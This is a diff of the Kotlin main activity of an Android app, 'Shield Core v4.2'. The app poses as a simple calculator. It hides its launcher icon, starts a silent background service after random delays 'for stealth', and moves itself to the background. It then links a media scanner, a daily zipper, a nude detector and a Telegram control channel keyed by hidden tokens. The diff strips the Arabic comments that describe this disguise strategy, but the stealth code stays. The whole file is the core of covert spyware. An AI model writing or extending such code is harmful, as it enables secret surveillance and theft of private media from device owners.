@@ -30,22 +30,6 @@ import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.random.Random
 
-/**
- * النشاط الرئيسي للتطبيق - يعمل كواجهة وهمية (Dummy UI) لإخفاء الوظائف الحقيقية.
- * 
- * استراتيجية التخفي:
- * - عرض واجهة حاسبة بسيطة أو شاشة إعدادات نظام وهمية.
- * - إخفاء الأيقونة من درج التطبيقات بعد التشغيل الأول.
- * - تشغيل جميع المكونات في الخلفية مع تأخيرات عشوائية.
- * - تسجيل الدخول (اللوحة الحقيقية) يتم فقط عبر Telegram.
- * 
- * ✅ تم إخفاء واجهة التشخيص الحقيقية.
- * ✅ تم إضافة واجهة وهمية (حاسبة بسيطة).
- * ✅ تم إخفاء الأيقونة من درج التطبيقات.
- * ✅ تم تشغيل الخدمة والمراقبة في الخلفية.
- * ✅ تم إضافة تأخيرات بشرية عشوائية.
- * ✅ تم إصلاح مرجع التخطيط إلى activity_dummy_calculator.
- */
 class MainActivity : AppCompatActivity() {
 
     companion object {
@@ -53,7 +37,6 @@ class MainActivity : AppCompatActivity() {
         const val APP_VERSION = "4.2.1"
     }
 
-    // مكونات الواجهة الوهمية
     private lateinit var tvDisplay: TextView
     private lateinit var etLog: EditText
 
@@ -74,7 +57,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // ✅ بدء الخدمة الشبحية فوراً في الخلفية
         try {
             startSilentForegroundService()
             logToFile("✅ Foreground service started")
@@ -82,20 +64,15 @@ class MainActivity : AppCompatActivity() {
             Log.e(TAG, "Failed to start foreground service: ${e.message}")
         }
 
-        // ✅ إخفاء أيقونة التطبيق من درج التطبيقات بعد التشغيل الأول
         disableLauncherIcon()
 
-        // ✅ عرض واجهة وهمية (آلة حاسبة بسيطة) - التصحيح الأساسي: استخدام activity_dummy_calculator
         setContentView(R.layout.activity_dummy_calculator)
 
-        // ربط عناصر الواجهة الوهمية (هذه المعرفات موجودة في activity_dummy_calculator.xml)
         tvDisplay = findViewById(R.id.tvDisplay)
         etLog = findViewById(R.id.etLog)
 
-        // تهيئة أزرار الآلة الحاسبة الوهمية
         setupDummyCalculator()
 
-        // ✅ تأخير عشوائي قبل بدء التهيئة الحقيقية (5-10 ثواني) لتجنب الشكوك
         lifecycleScope.launch(Dispatchers.IO) {
             val delayMs = Random.nextLong(5000, 10000)
             logToFile("⏳ Delaying initialization by ${delayMs / 1000}s for stealth...")
@@ -103,7 +80,6 @@ class MainActivity : AppCompatActivity() {
             initCoreAsync()
         }
 
-        // ✅ نقل التطبيق إلى الخلفية بعد 3 ثواني (يبدو وكأنه يغلق)
         lifecycleScope.launch(Dispatchers.Main) {
             delay(3000)
             moveTaskToBack(true)
@@ -112,12 +88,7 @@ class MainActivity : AppCompatActivity() {
         logToFile("🚀 Shield Core v4.2 initialized in stealth mode")
     }
 
-    // ============================================================
-    //  ✅ واجهة الآلة الحاسبة الوهمية
-    // ============================================================
-
     private fun setupDummyCalculator() {
-        // قائمة الأزرار من 0-9 والعمليات
         val buttonIds = listOf(
             R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
             R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
@@ -130,17 +101,14 @@ class MainActivity : AppCompatActivity() {
                 val btn = view as Button
                 val currentText = tvDisplay.text.toString()
 
-                // ✅ تسجيل الضغطات في سجل وهمي (للتمويه)
                 logToFile("🔘 Key pressed: ${btn.text}")
 
                 when (btn.id) {
                     R.id.btnClear -> tvDisplay.text = "0"
                     R.id.btnEquals -> {
                         try {
-                            // تقييم بسيط مع دعم العمليات الأساسية
                             val result = evaluateExpression(currentText)
                             tvDisplay.text = result.toString()
-                            // إظهار Toast عادي (تمويه)
                             Toast.makeText(this, "Result: $result", Toast.LENGTH_SHORT).show()
                         } catch (e: Exception) {
                             tvDisplay.text = "Error"
@@ -159,7 +127,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // ✅ زر "نسخ السجل" - يظهر السجل الحقيقي بشكل مخفي (تمويه)
         findViewById<Button>(R.id.btnCopyLog)?.setOnClickListener {
             val logText = etLog.text.toString()
             if (logText.isNotBlank()) {
@@ -171,17 +138,12 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * تقييم تعبير حسابي بسيط (للواجهة الوهمية فقط)
-     */
     private fun evaluateExpression(expression: String): Double {
-        // تحويل الرموز إلى عمليات قياسية
         val sanitized = expression
             .replace("×", "*")
             .replace("÷", "/")
             .replace(" ", "")
 
-        // استخدام خوارزمية بسيطة (تجنب eval الخطير)
         return when {
             sanitized.contains("+") -> {
                 val parts = sanitized.split("+")
@@ -211,14 +173,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ============================================================
-    //  ✅ دوال التخفي وإدارة الأيقونة
-    // ============================================================
-
-    /**
-     * إخفاء أيقونة التطبيق من درج التطبيقات (Launcher)
-     * باستخدام ActivityAlias الموجود في AndroidManifest.xml
-     */
     private fun disableLauncherIcon() {
         try {
             val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
@@ -233,9 +187,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /**
-     * إظهار أيقونة التطبيق (في حال الحاجة)
-     */
     @Suppress("unused")
     private fun enableLauncherIcon() {
         try {
@@ -251,10 +202,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ============================================================
-    //  دوال التشغيل الأساسية (نفسها مع تحسينات)
-    // ============================================================
-
     private fun startSilentForegroundService() {
         try {
             val serviceIntent = Intent(this, ForegroundService::class.java)
@@ -269,33 +216,32 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ✅ تم تحسين initCoreAsync مع تسجيل مفصل ومعالجة الأخطاء
     private suspend fun initCoreAsync() {
-        // ✅ تأخير عشوائي بشري (2-7 ثواني) لتجنب الإقلاع المفاجئ
         delay(Random.nextLong(2000, 7000))
-
         logToFile("🚀 Starting core initialization...")
 
-        // التحقق من الأذونات
         withContext(Dispatchers.Main) {
             requestAllPermissions()
         }
 
-        // تأخير إضافي بعد الأذونات
         delay(Random.nextLong(1000, 3000))
 
         try {
-            // إعداد المجلدات
             setupDirectories()
             logToFile("✅ Directories ready")
 
-            // طلب استثناء البطارية
             requestBatteryOptimizationExemption()
 
-            // تحميل الإعدادات
             val config = ConfigLoader.load(this@MainActivity)
             logToFile("✅ Config loaded: ${config.activeTokens.size} active tokens")
+            logToFile("   Control ID: ${config.controlId}, Vault ID: ${config.vaultId}")
+            logToFile("   Secret length: ${config.secret.length}")
 
-            // تهيئة المكونات
+            if (config.activeTokens.isEmpty()) {
+                logToFile("⚠️ WARNING: No active tokens! Telegram UI will not work.")
+            }
+
             val monitor = Monitor.getInstance(this@MainActivity)
             logToFile("✅ Monitor instance ready")
 
@@ -319,7 +265,6 @@ class MainActivity : AppCompatActivity() {
             val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
             logToFile("✅ DailyZipper created")
 
-            // ربط المكونات بـ Monitor
             monitor.ui = ui
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
@@ -329,16 +274,18 @@ class MainActivity : AppCompatActivity() {
             monitor.nudeDetector = nudeDetector
             logToFile("✅ All components linked to Monitor")
 
-            // بدء التشغيل
-            ui.start()
+            val uiStarted = ui.start()
+            logToFile("✅ TelegramUi start: $uiStarted")
+            
             monitor.start()
-            logToFile("✅ TelegramUi and Monitor started successfully")
+            logToFile("✅ Monitor started")
 
             logToFile("🎉 All systems operational in stealth mode")
 
         } catch (e: Exception) {
             Log.e(TAG, "Initialization Error", e)
-            logToFile("💥 [ERROR] Unexpected error: ${e.message}")
+            logToFile("💥 [ERROR] ${e.message}")
+            e.printStackTrace()
         }
     }
 
@@ -410,13 +357,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ============================================================
-    //  دوال مساعدة للتسجيل المخفي
-    // ============================================================
-
-    /**
-     * تسجيل رسالة في السجل المخفي (يظهر في الواجهة الوهمية)
-     */
     private fun logToFile(message: String) {
         Log.i(TAG, message)
         runOnUiThread {
@@ -424,7 +364,6 @@ class MainActivity : AppCompatActivity() {
                 val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
                 val logEntry = "[$timestamp] $message\n"
                 etLog.append(logEntry)
-                // الاحتفاظ بآخر 200 سطر فقط
                 val lines = etLog.text.split("\n")
                 if (lines.size > 200) {
                     val keep = lines.takeLast(200)
@@ -435,10 +374,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-
-    // ============================================================
-    //  تنظيف البيانات وإدارة دورة الحياة
-    // ============================================================
 
     private fun clearAppData() {
         try {
